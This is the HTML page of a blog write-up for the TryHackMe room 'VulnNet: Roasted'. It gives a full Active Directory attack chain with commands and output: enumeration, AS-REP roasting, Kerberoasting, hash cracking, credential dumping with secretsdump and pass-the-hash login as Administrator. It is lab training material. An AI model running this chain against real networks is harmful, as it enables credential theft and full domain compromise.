<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>geobour98</title><meta name=keywords content><meta name=description content="ðŸ“† 12/11/2022 - geobour98 âŒš 9 min
Introduction This is a TryHackMe room which can be found at: VulnNet: Roasted
VulnNet Entertainment quickly deployed another management instance on their very broad network&mldr;
Reconnaissance & Scanning Perform nmap scan to identify open ports and services treating the host as online.
  Command: nmap -p- -T4 -Pn -v 10.10.232.200  geobour98@kali:~$ nmap -p- -T4 -Pn -v 10.10.232.200 Starting Nmap 7.93 ( https://nmap."><meta name=author content><link rel=canonical href=https://geobour98.com/write-ups/thm/vulnnetroasted/><meta name=google-site-verification content="G-VH8LGJGC27"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style><link rel=preload href=logo.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://geobour98.com/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://geobour98.com/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://geobour98.com/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://geobour98.com/favicon/apple-touch-icon.png><link rel=mask-icon href=https://geobour98.com/logo.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-VH8LGJGC27"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-VH8LGJGC27",{anonymize_ip:!1})}</script><meta property="og:title" content="TryHackMe - VulnNet: Roasted"><meta property="og:description" content="ðŸ“† 12/11/2022 - geobour98 âŒš 9 min
Introduction This is a TryHackMe room which can be found at: VulnNet: Roasted
VulnNet Entertainment quickly deployed another management instance on their very broad network&mldr;
Reconnaissance & Scanning Perform nmap scan to identify open ports and services treating the host as online.
  Command: nmap -p- -T4 -Pn -v 10.10.232.200  geobour98@kali:~$ nmap -p- -T4 -Pn -v 10.10.232.200 Starting Nmap 7.93 ( https://nmap."><meta property="og:type" content="article"><meta property="og:url" content="https://geobour98.com/write-ups/thm/vulnnetroasted/"><meta property="og:image" content="https://geobour98.com/47"><meta property="article:section" content="write-ups"><meta property="og:site_name" content="geobour98"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://geobour98.com/47"><meta name=twitter:title content="TryHackMe - VulnNet: Roasted"><meta name=twitter:description content="ðŸ“† 12/11/2022 - geobour98 âŒš 9 min
Introduction This is a TryHackMe room which can be found at: VulnNet: Roasted
VulnNet Entertainment quickly deployed another management instance on their very broad network&mldr;
Reconnaissance & Scanning Perform nmap scan to identify open ports and services treating the host as online.
  Command: nmap -p- -T4 -Pn -v 10.10.232.200  geobour98@kali:~$ nmap -p- -T4 -Pn -v 10.10.232.200 Starting Nmap 7.93 ( https://nmap."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://geobour98.com/write-ups/"},{"@type":"ListItem","position":2,"name":"TryHackMe - VulnNet: Roasted","item":"https://geobour98.com/write-ups/thm/vulnnetroasted/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - VulnNet: Roasted","name":"TryHackMe - VulnNet: Roasted","description":"ðŸ“† 12/11/2022 - geobour98 âŒš 9 min\nIntroduction This is a TryHackMe room which can be found at: VulnNet: Roasted\nVulnNet Entertainment quickly deployed another management instance on their very broad network\u0026hellip;\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services treating the host as online.\n  Command: nmap -p- -T4 -Pn -v 10.10.232.200  geobour98@kali:~$ nmap -p- -T4 -Pn -v 10.10.232.200 Starting Nmap 7.93 ( https://nmap.","keywords":[],"articleBody":"ðŸ“† 12/11/2022 - geobour98 âŒš 9 min\nIntroduction This is a TryHackMe room which can be found at: VulnNet: Roasted\nVulnNet Entertainment quickly deployed another management instance on their very broad networkâ€¦\nReconnaissance \u0026 Scanning Perform nmap scan to identify open ports and services treating the host as online.\n  Command: nmap -p- -T4 -Pn -v 10.10.232.200  geobour98@kali:~$ nmap -p- -T4 -Pn -v 10.10.232.200 Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 13:51 EET Initiating Parallel DNS resolution of 1 host. at 13:51 Completed Parallel DNS resolution of 1 host. at 13:51, 0.00s elapsed Initiating Connect Scan at 13:51 Scanning 10.10.232.200 (10.10.232.200) [65535 ports] Discovered open port 139/tcp on 10.10.232.200 Discovered open port 135/tcp on 10.10.232.200 Discovered open port 53/tcp on 10.10.232.200 Discovered open port 445/tcp on 10.10.232.200 Discovered open port 49668/tcp on 10.10.232.200 Discovered open port 49699/tcp on 10.10.232.200 Discovered open port 49682/tcp on 10.10.232.200 Discovered open port 5985/tcp on 10.10.232.200 Discovered open port 49670/tcp on 10.10.232.200 Discovered open port 464/tcp on 10.10.232.200 Discovered open port 389/tcp on 10.10.232.200 Discovered open port 636/tcp on 10.10.232.200 Discovered open port 88/tcp on 10.10.232.200 Discovered open port 49665/tcp on 10.10.232.200 Discovered open port 49669/tcp on 10.10.232.200 Discovered open port 3269/tcp on 10.10.232.200 Discovered open port 3268/tcp on 10.10.232.200 Discovered open port 593/tcp on 10.10.232.200 Discovered open port 9389/tcp on 10.10.232.200 Completed Connect Scan at 13:53, 167.54s elapsed (65535 total ports) Nmap scan report for 10.10.232.200 (10.10.232.200) Host is up (0.11s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49665/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown 49682/tcp open unknown 49699/tcp open unknown  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 167.62 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports treating the host as online.\n  Command: sudo nmap -A -sC -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -v 10.10.232.200  geobour98@kali:~$ sudo nmap -A -sC -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -v 10.10.232.200 Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 14:01 EET NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 14:01 Completed NSE at 14:01, 0.00s elapsed Initiating NSE at 14:01 Completed NSE at 14:01, 0.00s elapsed Initiating NSE at 14:01 Completed NSE at 14:01, 0.00s elapsed Initiating Parallel DNS resolution of 1 host. at 14:01 Completed Parallel DNS resolution of 1 host. at 14:01, 0.00s elapsed Initiating SYN Stealth Scan at 14:01 Scanning 10.10.232.200 (10.10.232.200) [13 ports] Discovered open port 445/tcp on 10.10.232.200 Discovered open port 9389/tcp on 10.10.232.200 Discovered open port 139/tcp on 10.10.232.200 Discovered open port 53/tcp on 10.10.232.200 Discovered open port 135/tcp on 10.10.232.200 Discovered open port 3269/tcp on 10.10.232.200 Discovered open port 636/tcp on 10.10.232.200 Discovered open port 5985/tcp on 10.10.232.200 Discovered open port 3268/tcp on 10.10.232.200 Discovered open port 593/tcp on 10.10.232.200 Discovered open port 464/tcp on 10.10.232.200 Discovered open port 389/tcp on 10.10.232.200 Discovered open port 88/tcp on 10.10.232.200 Completed SYN Stealth Scan at 14:01, 0.23s elapsed (13 total ports) Initiating Service scan at 14:01 Scanning 13 services on 10.10.232.200 (10.10.232.200) Completed Service scan at 14:01, 13.56s elapsed (13 services on 1 host) Initiating OS detection (try #1) against 10.10.232.200 (10.10.232.200) Retrying OS detection (try #2) against 10.10.232.200 (10.10.232.200) Initiating Traceroute at 14:01 Completed Traceroute at 14:01, 0.16s elapsed Initiating Parallel DNS resolution of 1 host. at 14:01 Completed Parallel DNS resolution of 1 host. at 14:01, 0.00s elapsed NSE: Script scanning 10.10.232.200. Initiating NSE at 14:01 Completed NSE at 14:02, 40.05s elapsed Initiating NSE at 14:02 Completed NSE at 14:02, 2.42s elapsed Initiating NSE at 14:02 Completed NSE at 14:02, 0.00s elapsed Nmap scan report for 10.10.232.200 (10.10.232.200) Host is up (0.11s latency).  PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-11-08 12:01:20Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Network Distance: 2 hops TCP Sequence Prediction: Difficulty=259 (Good luck!) IP ID Sequence Generation: Incremental Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: | smb2-time: | date: 2022-11-08T12:01:35 |_ start_date: N/A |_clock-skew: -1s | smb2-security-mode: | 311: |_ Message signing enabled and required  TRACEROUTE (using port 445/tcp) HOP RTT ADDRESS 1 73.06 ms 10.8.0.1 (10.8.0.1) 2 149.15 ms 10.10.232.200 (10.10.232.200)  NSE: Script Post-scanning. Initiating NSE at 14:02 Completed NSE at 14:02, 0.00s elapsed Initiating NSE at 14:02 Completed NSE at 14:02, 0.00s elapsed Initiating NSE at 14:02 Completed NSE at 14:02, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 61.40 seconds  Raw packets sent: 97 (7.976KB) | Rcvd: 41 (2.404KB) We notice that the Domain is: vulnnet-rst.local. We can add this domain and its IP in the /etc/hosts file. We can also try to enumerate the shares and their permissions using smbmap.\n  Command: smbmap -H 10.10.232.200 -u anonymous  geobour98@kali:~$ smbmap -H 10.10.232.200 -u anonymous [+] Guest session IP: 10.10.232.200:445 Name: 10.10.232.200  Disk Permissions Comment  ---- ----------- -------  ADMIN$ NO ACCESS Remote Admin  C$ NO ACCESS Default share  IPC$ READ ONLY Remote IPC  NETLOGON NO ACCESS Logon server share  SYSVOL NO ACCESS Logon server share  VulnNet-Business-Anonymous READ ONLY VulnNet Business Sharing  VulnNet-Enterprise-Anonymous READ ONLY VulnNet Enterprise Sharing After some enumeration on the shares with READ ONLY permissions, we didnâ€™t find anything interesting.\nExploitation Then, we can use the script lookupsid.py from impacket in order to perform bruteforcing of Windows SIDâ€™s to identify users/groups on the remote target.\n  Command: /opt/impacket/examples/lookupsid.py anonymous@10.10.232.200  geobour98@kali:~$ /opt/impacket/examples/lookupsid.py anonymous@10.10.232.200 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  Password: [*] Brute forcing SIDs at 10.10.232.200 [*] StringBinding ncacn_np:10.10.232.200[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213 498: VULNNET-RST\\Enterprise Read-only Domain Controllers (SidTypeGroup) 500: VULNNET-RST\\Administrator (SidTypeUser) 501: VULNNET-RST\\Guest (SidTypeUser) 502: VULNNET-RST\\krbtgt (SidTypeUser) 512: VULNNET-RST\\Domain Admins (SidTypeGroup) 513: VULNNET-RST\\Domain Users (SidTypeGroup) 514: VULNNET-RST\\Domain Guests (SidTypeGroup) 515: VULNNET-RST\\Domain Computers (SidTypeGroup) 516: VULNNET-RST\\Domain Controllers (SidTypeGroup) 517: VULNNET-RST\\Cert Publishers (SidTypeAlias) 518: VULNNET-RST\\Schema Admins (SidTypeGroup) 519: VULNNET-RST\\Enterprise Admins (SidTypeGroup) 520: VULNNET-RST\\Group Policy Creator Owners (SidTypeGroup) 521: VULNNET-RST\\Read-only Domain Controllers (SidTypeGroup) 522: VULNNET-RST\\Cloneable Domain Controllers (SidTypeGroup) 525: VULNNET-RST\\Protected Users (SidTypeGroup) 526: VULNNET-RST\\Key Admins (SidTypeGroup) 527: VULNNET-RST\\Enterprise Key Admins (SidTypeGroup) 553: VULNNET-RST\\RAS and IAS Servers (SidTypeAlias) 571: VULNNET-RST\\Allowed RODC Password Replication Group (SidTypeAlias) 572: VULNNET-RST\\Denied RODC Password Replication Group (SidTypeAlias) 1000: VULNNET-RST\\WIN-2BO8M1OE1M1$ (SidTypeUser) 1101: VULNNET-RST\\DnsAdmins (SidTypeAlias) 1102: VULNNET-RST\\DnsUpdateProxy (SidTypeGroup) 1104: VULNNET-RST\\enterprise-core-vn (SidTypeUser) 1105: VULNNET-RST\\a-whitehat (SidTypeUser) 1109: VULNNET-RST\\t-skid (SidTypeUser) 1110: VULNNET-RST\\j-goldenhand (SidTypeUser) 1111: VULNNET-RST\\j-leet (SidTypeUser) We found some usernames, so we can create a wordlist with usernames in order to use it to ASREPRoasting attack. The wordlist usernames.txt should look like this:\nWIN-2BO8M1OE1M1$ enterprise-core-vn a-whitehat t-skid j-goldenhand j-leet Then, we execute the script GetNPUsers.py from impacket in order to perform the ASREPRoasting attack, which is used to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will then be encrypted with the userâ€™s password, which can then be cracked offline.   Command: /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.232.200 -usersfile usernames.txt -no-pass vulnnet-rst.local/  geobour98@kali:~$ /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.232.200 -usersfile usernames.txt -no-pass vulnnet-rst.local/ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  [-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:91a27a1253abc7bca67160c568048fd1$1167e38fb3eb84adf9a6748af9139fb43085e118f98bd0997c7ab51d0f8aa163893f1fdc3581e61a8536bc7c87d8799d21e301f821111598369aa5d5adcb398b73e4e1a98b9acd984093080a1d37a16d486596ef4e5063e1a496d6099e6967e0b9ea0407418d65604aee49f2683adc2d786bdc4a348db3c3f0b8596dbfe0ac37a2ecd0af2d7323d152155b610b21bded3d313492a7967ebee48b8f47dba5e1f5e939a2b96b104f0b7dc8f5a2c6b3ed625ace4bbad0ecab95a38787cebdc0a2f1662d7abb7797d1ef78a82807f9159432ec7c976cf5378dd171a22d7d8a76a5aede03ffac4724219391394ea547f204c37ab3f2d89a84 [-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set [-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set We found the hash for the user t-skid, which we put in a file and crack it with hashcat on mode 18200.\n  Command: hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  geobour98@kali:~$ hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:33a9b2294ab57133e1f428724cafeaee$ad62d6b18dcbd50c7a501b186e65e9fe12fbde18015bd1c4748b2dab89db657461d940b1d1afe024e003ed6ef9d9e6f9d2d3566bfdeeeabece7fad7073239b11d4c8cca7641889e380e6e3d150f99595586090c906280737698476b60d7bc888f1d810adc3a5b69239e16e745c0cd091365736a42baf9e9428dd0fcfd83a6d038d82bcd5a3c87e42f6c277f1a8ed384c555052498a3b478cdad4fb22f2f7685a0b0fd837725ddadcb6640fa46b53502b24f2be59e1e120a872e0de0fd3544590bfb905eb435833339dc28c9adc06b6ec795dedb775db071b479a32aee442460ae2ad1631e7eed0097a539e59f07e6517562e7b7dabb1:tj072889*  So, the cleartext password for t-skid is tj072889*.\nNow, we can perform the Kerberoasting attack, which attempts to fetch Service Principal Names that are associated with normal user accounts. A ticket that is encrypted with the user accountâ€™s password is returned, which can then be bruteforced offline.\n  Command: /opt/impacket/examples/GetUserSPNs.py vulnnet-rst.local/t-skid:'tj072889*' -dc-ip 10.10.232.200 -request  geobour98@kali:~$ /opt/impacket/examples/GetUserSPNs.py vulnnet-rst.local/t-skid:'tj072889*' -dc-ip 10.10.232.200 -request Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------- ------------------ ------------------------------------------------------------- -------------------------- -------------------------- ---------- CIFS/vulnnet-rst.local enterprise-core-vn CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local 2021-03-11 21:45:09.913979 2021-03-14 01:41:17.987528    [-] CCache file is not found. Skipping... $krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$5bc05b5e08a81cb226c6b23272df4e95$7f705c093630a21b08128de6dae88225bba2cae7589aefbf31098f167ed23d1f91dcaa2a6386c770b706278366fb6e02cf533172ea5777f90d1efaaac48f9045fc1fa792e2ca57eaf2d12c6fa86e30c7c2421fc7c98cf5ccc1a131563dd3af338467861ec715476354d49c310588a38b29df8217a99eba6168728b489807e72785850279bd1a51a15caca272cac5285396d0fd13c05f6c889408cacf2171b45af9c438f048c7ac35b89295f447e908d2df8e5f90761cdbb9ddf87c7ffb816ccae03fbc36fb0d6a80569047a4c6cc51a0d1cb7187d7e1288216bfcc94a25a7ac026ae6508207784da01e7c7660f339fe8bb7a88d68be95f5c0331d05cf34c56288c21df9d5e0f6d7b2aa566ba3891855ccaff60e26eda257b251421978119494e6597c493ea4b769f276d156ed729c768f71849c4cb03fb75ca861a0cb7bd226de2c3503a43aaecff8245d3566cc61784d285b3d9e7c051b63ef366ef810fda31e3ead5cd3de68c14ed0447db4b43c2eae2cfa8444335a1a12e8033d0fa4334b52278d1d4189950bb6b23afddec426e8da50d921ff7af781027577a82c36492f1da51375d906e1a7ee820888e516f407ed105eebd1741fba436b2cbc84bf6544c825d6ca6aca61e4bf2ad9828c3607aec0072efbeb674bd4ea39434ec7cc670f1932005703284fddd2a79173ffb44f29fb6cd829a329ccf3e8bdb6ea81a72606b74eee58519dc038ce9403321be7638f6bc2ddd1a6a317bea60bd3dbf897c8250d39c50056be9e1b0c3600f32252bed046c67ba849c55f0642c9b6565597003e77bfa97d3923232061d097e02c64286967b0356e6993800a46b237b14fbd60eb98415ed366cd79ba39c39eee92c6507a173bf4887314f818be716530d7f9ce15f97ed6c9fb01e20b75253abae72cdb316730f56c88652ac2657b764438f8caf7dadb94c78e3cbf4bcfd775436f14b6738b3e631af6e73e89eb0ae7aeee04c0b290c275b21f9cc4fb193fa90374d8bf214ea231b2d6db4c2a2281e1e5ef33070139172576c02542b3a4e58e503b995ea44f0a123da1c4d122ae2381974a0881568d9793e978587b1959925044e1e4d970bedcfe09f71e9837aca764214549ca77d8467113ab367001e4fed7402c5aa989cd9ca9bf4c27219b52c4b2d3a85c7f5d9ca6fa914c847ba7646eef11cd9fd0ee612e5815130f054e76f163d3d0e064e6285759df9e45df44534c05a8e3f8fe2c0925aaf9a689975288b6f6138d5f6b8dc9404767f7a0aa24afce821a0f146acf9b1856e15f0a000b727a47c35073d215e53e781f56d4f6218e43595b6bc70c4f58d4c92a2de03e81faf1fc6954e1dc8b3581dd2f1e5c5b4a091965736c554a3eb692561c24ee1fdcfbcd26a9d1b We found the hash for the user enterprise-core-vn, which we can put in a file and crack it with hashcat on mode 13100.\n  Command: hashcat -m 13100 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt  geobour98@kali:~$ hashcat -m 13100 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt  $krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$5bc05b5e08a81cb226c6b23272df4e95$7f705c093630a21b08128de6dae88225bba2cae7589aefbf31098f167ed23d1f91dcaa2a6386c770b706278366fb6e02cf533172ea5777f90d1efaaac48f9045fc1fa792e2ca57eaf2d12c6fa86e30c7c2421fc7c98cf5ccc1a131563dd3af338467861ec715476354d49c310588a38b29df8217a99eba6168728b489807e72785850279bd1a51a15caca272cac5285396d0fd13c05f6c889408cacf2171b45af9c438f048c7ac35b89295f447e908d2df8e5f90761cdbb9ddf87c7ffb816ccae03fbc36fb0d6a80569047a4c6cc51a0d1cb7187d7e1288216bfcc94a25a7ac026ae6508207784da01e7c7660f339fe8bb7a88d68be95f5c0331d05cf34c56288c21df9d5e0f6d7b2aa566ba3891855ccaff60e26eda257b251421978119494e6597c493ea4b769f276d156ed729c768f71849c4cb03fb75ca861a0cb7bd226de2c3503a43aaecff8245d3566cc61784d285b3d9e7c051b63ef366ef810fda31e3ead5cd3de68c14ed0447db4b43c2eae2cfa8444335a1a12e8033d0fa4334b52278d1d4189950bb6b23afddec426e8da50d921ff7af781027577a82c36492f1da51375d906e1a7ee820888e516f407ed105eebd1741fba436b2cbc84bf6544c825d6ca6aca61e4bf2ad9828c3607aec0072efbeb674bd4ea39434ec7cc670f1932005703284fddd2a79173ffb44f29fb6cd829a329ccf3e8bdb6ea81a72606b74eee58519dc038ce9403321be7638f6bc2ddd1a6a317bea60bd3dbf897c8250d39c50056be9e1b0c3600f32252bed046c67ba849c55f0642c9b6565597003e77bfa97d3923232061d097e02c64286967b0356e6993800a46b237b14fbd60eb98415ed366cd79ba39c39eee92c6507a173bf4887314f818be716530d7f9ce15f97ed6c9fb01e20b75253abae72cdb316730f56c88652ac2657b764438f8caf7dadb94c78e3cbf4bcfd775436f14b6738b3e631af6e73e89eb0ae7aeee04c0b290c275b21f9cc4fb193fa90374d8bf214ea231b2d6db4c2a2281e1e5ef33070139172576c02542b3a4e58e503b995ea44f0a123da1c4d122ae2381974a0881568d9793e978587b1959925044e1e4d970bedcfe09f71e9837aca764214549ca77d8467113ab367001e4fed7402c5aa989cd9ca9bf4c27219b52c4b2d3a85c7f5d9ca6fa914c847ba7646eef11cd9fd0ee612e5815130f054e76f163d3d0e064e6285759df9e45df44534c05a8e3f8fe2c0925aaf9a689975288b6f6138d5f6b8dc9404767f7a0aa24afce821a0f146acf9b1856e15f0a000b727a47c35073d215e53e781f56d4f6218e43595b6bc70c4f58d4c92a2de03e81faf1fc6954e1dc8b3581dd2f1e5c5b4a091965736c554a3eb692561c24ee1fdcfbcd26a9d1b:ry=ibfkfv,s6h,  So, the cleartext password for enterprise-core-vn is ry=ibfkfv,s6h,. We can login as enterprise-core-vn using evil-winrm and read the user flag.\n  Command: evil-winrm -i 10.10.232.200 -u enterprise-core-vn  geobour98@kali:~$ evil-winrm -i 10.10.232.200 -u enterprise-core-vn Enter Password:  Evil-WinRM shell v3.4  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\\Users\\enterprise-core-vn\\Documents cd ../Desktop *Evil-WinRM* PS C:\\Users\\enterprise-core-vn\\Desktop type user.txt [REDACTED] *Evil-WinRM* PS C:\\Users\\enterprise-core-vn\\Desktop Privilege Escalation Now we can access the NETLOGON share as the user enterprise-core-vn and see an interesting file ResetPassword.vbs, which we can download.\n  Command: smbclient \\\\\\\\10.10.232.200\\\\NETLOGON -U enterprise-core-vn  geobour98@kali:~$ smbclient \\\\\\\\10.10.232.200\\\\NETLOGON -U enterprise-core-vn Password for [WORKGROUP\\enterprise-core-vn]: Try \"help\" to get a list of possible commands. smb: \\ prompt off smb: \\ mget * getting file \\ResetPassword.vbs of size 2821 as ResetPassword.vbs (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec) smb: \\ exit  geobour98@kali:~$ cat ResetPassword.vbs  strUserNTName = \"a-whitehat\" strPassword = \"bNdKVkjv3RR9ht\"  So, we found the cleartext password bNdKVkjv3RR9ht of user a-whitehat inside the file ResetPassword.vbs. Now we can use the script secretsdump.py from impacket in order to to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit.\n  Command: /opt/impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@10.10.232.200  geobour98@kali:~$ /opt/impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@10.10.232.200 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation   [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  Now, we can login with the nthash of the Administrator user using evil-winrm.\n  Command: evil-winrm -i 10.10.232.200 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d  geobour98@kali:~$ evil-winrm -i 10.10.232.200 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d vil-WinRM shell v3.4  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\\Users\\Administrator\\Documents cd ../Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop type system.txt [REDACTED] *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop whoami vulnnet-rst\\administrator *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop Now are the Administrator user and can read the system flag.\nProof of Concept (PoC image): windows active-directory smbmap smbclient impacket lookupsid.py asreproasting getnpusers.py hashcat kerberoasting getuserspns.py evil-winrm secretsdump.py  ","wordCount":"1869","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://geobour98.com/write-ups/thm/vulnnetroasted/"},"publisher":{"@type":"Organization","name":"geobour98","logo":{"@type":"ImageObject","url":"https://geobour98.com/favicon/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://geobour98.com/ accesskey=h title="geobour98 (Alt + H)"><img src=https://geobour98.com/logo.png alt=logo aria-label=logo height=35>geobour98</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://geobour98.com/about/ title=About><span>About</span></a></li><li><a href=https://geobour98.com/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://geobour98.com/write-ups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://geobour98.com/tags/ 